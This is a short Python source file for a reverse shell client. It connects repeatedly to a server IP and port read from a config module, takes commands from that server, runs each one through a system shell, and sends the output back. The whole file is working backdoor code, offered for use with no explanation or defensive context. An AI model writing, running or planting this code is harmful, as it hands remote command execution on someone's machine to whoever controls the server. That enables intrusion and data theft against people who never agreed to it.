from multiprocessing import connection
from pickle import TRUE
import socket
import subprocess
import time
import tools.config as config
import tools.utility as utility

def shell():
    while True:
        cmd = utility.reliable_recv(client_socket)
        print('shell() cmd : %s ' % cmd )
        if cmd == 'quit':
            break
        else:
            exec = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            res = exec.stdout.read() + exec.stderr.read()
            res = res.decode()
            print('shell() res : %s ' % res )
            utility.reliable_send(client_socket,res)

def connection():
    while True:
        time.sleep(7)
        try :
            client_socket.connect((config.server_ip,config.port))
            print('connection()')
            shell()
            client_socket.close()
            break
        except:
            connection()

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
## socket.AF_NET : ipv4 add
## socket.SOCK_STREAM tcp conn

connection()